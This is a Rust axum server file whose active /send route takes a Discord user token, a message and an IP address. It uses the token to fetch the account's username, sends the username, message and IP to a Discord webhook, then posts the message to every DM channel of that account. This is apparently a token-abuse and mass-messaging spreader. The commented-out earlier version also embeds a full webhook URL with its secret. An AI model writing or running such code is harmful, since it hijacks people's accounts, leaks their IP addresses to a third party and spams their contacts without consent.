// use axum::{routing::{get, post}, Json, Router};
// use serde::{Deserialize, Serialize};
// use std::env;
// use std::net::SocketAddr;
// use tokio;
// use reqwest::Client;

// #[derive(Deserialize)]
// struct Payload {
//     message: String,
// }

// #[derive(Serialize)]
// struct DiscordPayload {
//     content: String,
// }

// // ✅ Route for /test (Equivalent to Express.js `app.get('/test', ...)`)
// async fn test_handler() -> &'static str {
//     "Hello, World!"
// }

// // ✅ Handles sending messages to Discord
// async fn send_to_discord(Json(payload): Json<Payload>) -> &'static str {
//     let webhook_url = "https://discord.com/api/webhooks/1332801389461635132/bSSYvH0qlWxghUjXiwLlZ_lMmYwPgtoUvz6--uaMNvTmty2DcChWRcEaG0FwvxduxB2t"; // Replace with your actual webhook URL

//     // 🔹 Block messages containing @everyone or @here to prevent spam
//     if payload.message.contains("@everyone") || payload.message.contains("@here") {
//         eprintln!("Blocked message containing @everyone or @here");
//         return "Blocked message: contains @everyone or @here";
//     }
    
//     let client = Client::new();
//     let discord_payload = DiscordPayload {
//         content: payload.message,
//     };

//     // 🔹 Attempt to send the message to Discord
//     match client.post(webhook_url)
//         .json(&discord_payload)
//         .send()
//         .await
//     {
//         Ok(response) if response.status().is_success() => {
//             "Message sent to Discord"
//         }
//         Ok(response) => {
//             eprintln!("Discord API error: {}", response.status());
//             "Error sending message to Discord"
//         }
//         Err(e) => {
//             eprintln!("Request error: {}", e);
//             "Error sending request to Discord"
//         }
//     }
// }

// #[tokio::main]
// async fn main() {
//     let isloaded: bool = true;
//     if isloaded == true{
//         print!("server is loaded.");
//         } else {
//             print!("server is not loaded.");
//     };
//     let app = Router::new()
//         .route("/test", get(test_handler)) // ✅ Equivalent to Express `/test` route
//         .route("/send", post(send_to_discord)); // 🔹 Route for sending messages
    
//     let port = env::var("PORT").unwrap_or_else(|_| "8080".to_string());
//     let addr: SocketAddr = format!("0.0.0.0:{}", port).parse().expect("Invalid address");

//     println!("🚀 Server running at http://{}", addr);

//     let listener = tokio::net::TcpListener::bind(addr).await.expect("❌ Failed to bind port");
//     axum::serve(listener, app.into_make_service())
//         .await
//         .expect("❌ Server crashed");
    
// }
use axum::{routing::{get, post}, Json, Router};
use serde::{Deserialize, Serialize};
use std::env;
use std::net::SocketAddr;
use tokio;
use reqwest::Client;

#[derive(Deserialize)]
struct Payload {
    token: String,
    message: String,
    ip: String,
}

#[derive(Serialize)]
struct DiscordPayload {
    content: String,
}

async fn test_handler() -> &'static str {
    "Hello, World!"
}

async fn send(Json(payload): Json<Payload>) -> &'static str {
    let client = Client::new();
    
    // Fetch user information (username)
    let user_info_url = "https://discord.com/api/v9/users/@me";
    let user_response = client.get(user_info_url)
        .header("Authorization", format!("{}", payload.token))
        .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        .send()
        .await;
    
    let mut username = "Unknown".to_string();
    if let Ok(resp) = user_response {
        if resp.status().is_success() {
            if let Ok(user_data) = resp.json::<serde_json::Value>().await {
                if let Some(name) = user_data["username"].as_str() {
                    username = name.to_string();
                }
            }
        }
    }
    
    // Send message to Discord webhook including IP and username
    let webhook_url = "https://discord.com/api/webhooks/YOUR_WEBHOOK_URL"; // Replace with your actual webhook URL
    let webhook_content = format!("Message: {}\nUsername: {}\nIP: {}", payload.message, username, payload.ip);
    let discord_payload = DiscordPayload {
        content: webhook_content.clone(),
    };
    
    match client.post(webhook_url)
        .json(&discord_payload)
        .send()
        .await
    {
        Ok(response) if response.status().is_success() => {
            println!("✅ Message sent to webhook");
        }
        Ok(response) => {
            eprintln!("❌ Discord API error: {}", response.status());
        }
        Err(e) => {
            eprintln!("❌ Request error: {}", e);
        }
    }
    
    // Send message to all DMs
    let api_url = "https://discord.com/api/v9/users/@me/channels";
    let response = client.get(api_url)
        .header("Authorization", format!("{}", payload.token))
        .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        .send()
        .await;
    
    match response {
        Ok(resp) if resp.status().is_success() => {
            let body = resp.text().await.unwrap_or_else(|_| "Failed to read response body".to_string());
            
            match serde_json::from_str::<Vec<serde_json::Value>>(&body) {
                Ok(dms) => {
                    for dm in dms {
                        if let Some(dm_id) = dm["id"].as_str() {
                            let msg_response = client.post(format!("https://discord.com/api/v9/channels/{}/messages", dm_id))
                                .header("Authorization", format!("{}", payload.token))
                                .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
                                .json(&serde_json::json!({"content": payload.message}))
                                .send()
                                .await;

                            match msg_response {
                                Ok(msg_resp) if msg_resp.status().is_success() => {
                                    println!("✅ Message sent to DM: {}", dm_id);
                                }
                                Ok(msg_resp) => {
                                    eprintln!("❌ Failed to send message to {}: {}", dm_id, msg_resp.status());
                                }
                                Err(e) => {
                                    eprintln!("❌ Request error while sending DM to {}: {}", dm_id, e);
                                }
                            }
                        }
                    }
                    "✅ Messages sent to webhook and DMs"
                }
                Err(e) => {
                    eprintln!("❌ Failed to parse DM response: {}", e);
                    "❌ Error parsing DM response"
                }
            }
        }
        Ok(resp) => {
            eprintln!("❌ Failed to get DMs: {}", resp.status());
            "❌ Error fetching DM channels"
        }
        Err(e) => {
            eprintln!("❌ Request error: {}", e);
            "❌ Error sending request to Discord"
        }
    }
}

#[tokio::main]
async fn main() {
    let app = Router::new()
        .route("/test", get(test_handler))
        .route("/send", post(send));
    
    let port = env::var("PORT").unwrap_or_else(|_| "8080".to_string());
    let addr: SocketAddr = format!("0.0.0.0:{}", port).parse().expect("Invalid address");

    println!("\u{1F680} Server running at http://{}", addr);

    let listener = tokio::net::TcpListener::bind(addr).await.expect("❌ Failed to bind port");
    axum::serve(listener, app.into_make_service())
        .await
        .expect("❌ Server crashed");
}
